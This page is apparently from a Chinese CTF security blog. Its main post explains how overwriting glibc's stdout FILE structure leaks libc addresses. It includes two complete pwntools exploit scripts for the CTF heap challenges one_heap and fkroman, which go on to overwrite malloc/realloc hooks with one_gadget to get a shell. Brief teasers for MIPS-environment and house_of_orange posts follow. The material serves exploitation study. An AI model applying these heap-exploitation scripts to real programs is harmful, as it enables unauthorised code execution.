<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="jumbotron">
  <div class="video">
    
      <div class="video-frame">
        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
      </div>
    
    <div class="video-media">
      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
        <source src="/images/ocean/ocean.mp4" type="video/mp4">
        <source src="/images/ocean/ocean.ogv" type="video/ogg">
        <source src="/images/ocean/ocean.webm" type="video/webm">
        <p>Your user agent does not support the HTML5 Video element.</p>
      </video>
      <div class="video-overlay"></div>
    </div>
    <div class="video-inner text-center text-white">
      <h1><a href="/">The lair of C0yo7e</a></h1>
      <p></p>
      <div><img src="/images/time.png" class="brand" alt="The lair of C0yo7e"></div>
    </div>
    <div class="video-learn-more">
      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
    </div>
  </div>
</section>

<div id="landingpage">
  <section class="outer">
  <article class="articles">
    
    <h1 class="page-type-title"></h1>

    
      
        

<article id="post-IO-FILE-leakaddr" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/08/01/IO-FILE-leakaddr/">IO_FILE-leakaddr</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/01/IO-FILE-leakaddr/" class="article-date">
  <time datetime="2020-08-01T14:01:50.000Z" itemprop="datePublished">2020-08-01</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h3 id="任意读原理"><a href="#任意读原理" class="headerlink" title="任意读原理"></a>任意读原理</h3><p>stderr、stdout、stdin这三个函数拥有IO_FILE结构体，要利用IO_FILE实现任意读，就要利用到stdout。<br>首先，puts和write函数的执行，都会通过 <code>_IO_new_file_overflow</code> 这个函数最后执行 <code>_IO_overflow</code></p>
<blockquote>
<p><strong>puts</strong>:  <em>_IO_puts</em> –&gt; <em>_IO_sputn</em> –&gt; <em>_IO_new_file_xsputn</em> –&gt; <em>_IO_new_file_overflow</em> –&gt; <em>_IO_do_write</em> –&gt; <em>new_do_write</em> –&gt; <em>_IO_SYSWRITE</em></p>
<p><strong>fwrite</strong>: <em>_IO_fwrite</em> –&gt; <em>_IO_sputn</em> –&gt; <em>_IO_new_file_xsputn</em> –&gt; <em>_IO_new_file_overflow</em> –&gt; <em>_IO_do_write</em> –&gt; <em>new_do_write</em> –&gt; <em>_IO_SYSWRITE</em></p>
</blockquote>
<p>_IO_new_file_xsputn的源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;//判断缓存区有多少空间</span><br><span class="line">        count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">        if (count &gt;= n)</span><br><span class="line">        &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    if (count &gt; 0)</span><br><span class="line">    &#123;//有空间的话就把数据拷贝至缓冲区</span><br><span class="line">        if (count &gt; to_do)</span><br><span class="line">            count = to_do;</span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        s += count;</span><br><span class="line">        to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">    if (to_do + must_flush &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        size_t block_size, do_write;</span><br><span class="line">        /* Next flush the (full) buffer. */</span><br><span class="line">        if (_IO_OVERFLOW (f, EOF) == EOF) //进入_IO_new_file_overflow</span><br><span class="line">        /* If nothing else has to be written we must not signal the caller that everything has been written.  */</span><br><span class="line">            return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>

<p>_IO_new_file_overflow源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (FILE *f, int ch)</span><br><span class="line">&#123;</span><br><span class="line">    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">    &#123;//不进入</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  /* If currently reading or no buffer allocated. */</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">    &#123;//不进入</span><br><span class="line">      /* Allocate a buffer if needed. */</span><br><span class="line">        if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          _IO_doallocbuf (f);</span><br><span class="line">          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    if (ch == EOF) //调用_IO_new_do_write</span><br><span class="line">        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</span><br><span class="line">        if (_IO_do_flush (f) == EOF)</span><br><span class="line">            return EOF;</span><br><span class="line">    *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">        if (_IO_do_write (f, f-&gt;_IO_write_base,  f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">            return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>_IO_new_do_write的源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static size_t</span><br><span class="line">new_do_write (FILE *fp, const char *data, size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">    size_t count;</span><br><span class="line">    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    /* On a system without a proper O_APPEND implementation,</span><br><span class="line">       you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">       not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">       Instead, just indicate that offset (before and after) is</span><br><span class="line">       unpredictable. */</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;//不能进入</span><br><span class="line">        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">        // fseek(stdout, x, 1) always return _IO_pos_BAD (-1)</span><br><span class="line">        if (new_pos == _IO_pos_BAD)</span><br><span class="line">            return 0;</span><br><span class="line">        fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    count = _IO_SYSWRITE (fp, data, to_do);//执行write</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/libio/libio.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br></pre></td></tr></table></figure>

<h6 id="关于flag的绕过："><a href="#关于flag的绕过：" class="headerlink" title="关于flag的绕过："></a>关于flag的绕过：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">综上，我们需要绕过的有：</span><br><span class="line">-  f-&gt;_flags &amp; _IO_NO_WRITES = 0</span><br><span class="line">-  f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = 1</span><br><span class="line">-  fp-&gt;_IO_read_end = fp-&gt;_IO_write_base 或者 _flag &amp; IO_IS_APPENDING = 1</span><br><span class="line">-  _fileno = 1</span><br><span class="line">-  _IO_write_base是我们传输给_IO_SYSWRITE的参数，即是我们leak出来的地址</span><br><span class="line">-  _IO_write_base与_IO_write_ptr的差是write出来的字节数，所以我们要覆盖base的低位使之变小</span><br></pre></td></tr></table></figure>

<p>_flags里面包含<code>_IO_IS_APPENDING</code>，<code>_IO_IS_APPENDING</code>的定义为<code>#define _IO_IS_APPENDING 0x1000</code>，这样就不会走后面的这个判断而直接执行到<code>_IO_SYSWRITE</code>了<br>按理是满足接下来这些条件就可以了的：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#_IO_new_file_xsputn (if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)))</span></span><br><span class="line">&gt; f-&gt;flag &amp; 0xa00 &gt;0;</span><br><span class="line">&gt; <span class="comment">#_IO_new_file_overflow f-&gt;_flags &amp; _IO_NO_WRITES</span></span><br><span class="line">&gt; f-&gt;_flags &amp; 0x8 = 0;</span><br><span class="line">&gt; <span class="comment">#new_do_write if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span></span><br><span class="line">&gt; f-&gt;flag &amp; 0x1000 == 1;(&gt;0)</span><br><span class="line">&gt; f-&gt;write_base != f-&gt;write_ptr;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = 0xfbad0000</span><br><span class="line">flag &amp;= ~0x008 （最后一位）</span><br><span class="line">flag |= 0x0800 （倒数三位） 不能是奇数</span><br><span class="line">flag |= 0x1000 （倒数第四位） 不能是偶数</span><br><span class="line"></span><br><span class="line">--&gt; flag = 0xfbad1800</span><br></pre></td></tr></table></figure>

<h6 id="不改flag的绕过："><a href="#不改flag的绕过：" class="headerlink" title="不改flag的绕过："></a>不改flag的绕过：</h6><p>要使<code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>不成立才能执行write</p>
<p>所以要满足的条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_write_base指向想要泄露的地方。</span><br><span class="line">_IO_write_ptr指向泄露结束的地址。//两者要有差距</span><br><span class="line">_IO_read_end等于_IO_write_base以绕过多余的代码。</span><br><span class="line"></span><br><span class="line">//满足这三个条件，可实现任意读。</span><br></pre></td></tr></table></figure>

<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><h5 id="2019-one-heap"><a href="#2019-one-heap" class="headerlink" title="2019 one_heap"></a>2019 one_heap</h5><p>这是一道tcache+IO_FILE的题</p>
<p>有限的删除数量，就利用tcache机制构造chunk，将chunk写进unsorted bin里</p>
<p>指针指向stdout，实现覆写flag和write_base等数据，leak出libc的地址，然后unsorted bin attack 更改realloc_hook。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">"./one_heap"</span>)</span><br><span class="line">		<span class="comment">#p = remote('47.104.89.129',10001)</span></span><br><span class="line">		<span class="comment">#context.log_level='debug'</span></span><br><span class="line">		<span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">		libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">		delete()</span><br><span class="line">		delete()</span><br><span class="line">		add(<span class="number">0x2f</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x20</span>)+<span class="string">'\n'</span>)</span><br><span class="line">		delete()</span><br><span class="line">		add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x7f</span>,<span class="string">'\n'</span>)</span><br><span class="line">		delete()</span><br><span class="line">		add(<span class="number">0x20</span>,<span class="string">'\x60\x97\n'</span>)</span><br><span class="line">		add(<span class="number">0x7f</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">		p.recv(<span class="number">8</span>)</span><br><span class="line">		p.recv(<span class="number">8</span>)</span><br><span class="line">		libc.address=u64((p.recv(<span class="number">6</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ed8b0</span></span><br><span class="line">		<span class="keyword">print</span> hex(libc.address)</span><br><span class="line">		realloc_hook=libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">		realloc = libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">		one_gadget = libc.address+<span class="number">0x10a38c</span></span><br><span class="line">		add(<span class="number">0x70</span>,p64(<span class="number">0</span>)*<span class="number">10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(realloc_hook)+<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x30</span>,p64(one_gadget)+p64(realloc+<span class="number">4</span>)+<span class="string">'\n'</span>)</span><br><span class="line">		add(<span class="number">0x10</span>,<span class="string">'\n'</span>)</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h5 id="2109-数字经济-fkroman"><a href="#2109-数字经济-fkroman" class="headerlink" title="2109 数字经济 fkroman"></a>2109 数字经济 fkroman</h5><p>没办法通过show函数leak出libc的地址，所以我们会想到IO_FILE<br>漏洞，可以uaf，然后，edit可以自己重写size，造成溢出，重构fd，达到任意地址写的目的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)  <span class="comment">#0</span></span><br><span class="line"><span class="comment"># edit(0,0x68,'a'*0x68)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment"># add(3,0x68)</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delt(<span class="number">1</span>) </span><br><span class="line">edit(<span class="number">1</span>,<span class="number">2</span>,<span class="string">'\xdd\x25'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">pay = <span class="number">0x33</span>*<span class="string">'A'</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">stderr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stderr)</span><br><span class="line">libc_base = stderr +<span class="number">0x20</span> -libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(malloc_hook)</span><br><span class="line">fack_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">onegadget = one[<span class="number">3</span>] + libc_base</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(fack_chunk))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">pay = <span class="number">0x13</span>*<span class="string">'A'</span> + p64(onegadget)</span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/01/IO-FILE-leakaddr/" data-id="ckdbq6hh00000sgsw1konxbgq"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-mips编译环境配置与简单栈溢出" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/05/12/mips编译环境配置与简单栈溢出/">mips编译环境配置与简单栈溢出</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/05/12/mips编译环境配置与简单栈溢出/" class="article-date">
  <time datetime="2020-05-12T10:00:33.000Z" itemprop="datePublished">2020-05-12</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h2 id="环境编译"><a href="#环境编译" class="headerlink" title="环境编译"></a>环境编译</h2><p>首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天）</p>
<h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>下载：<a href="https://buildroot.org/download" target="_blank" rel="noopener">buildroot</a></p>
<p>解压之后，configs里面有一个<code>qemu_mips32r2el_malta_defconfig</code>这样的配置，可以进去找找看有没有，我们回到主目录，直接<code>make qemu_mips32r2el_malta_defconfig</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make qemu_mips32r2el_malta_defconfig</span><br><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make</span><br></pre></td></tr></table></figure>

<p>make qemu…那个命令就是配置相对应的环境，就不用手动<code>make menuconfig</code> 去设置了。</p>
        
          <a class="article-more-link" href="/2020/05/12/mips编译环境配置与简单栈溢出/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/05/12/mips编译环境配置与简单栈溢出/" data-id="ckdbq6hhk0009sgswdqqlsnwg"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-house-of-orange" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/03/10/house-of-orange/">house_of_orange</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/03/10/house-of-orange/" class="article-date">
  <time datetime="2020-03-10T03:44:04.000Z" itemprop="datePublished">2020-03-10</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。</p>
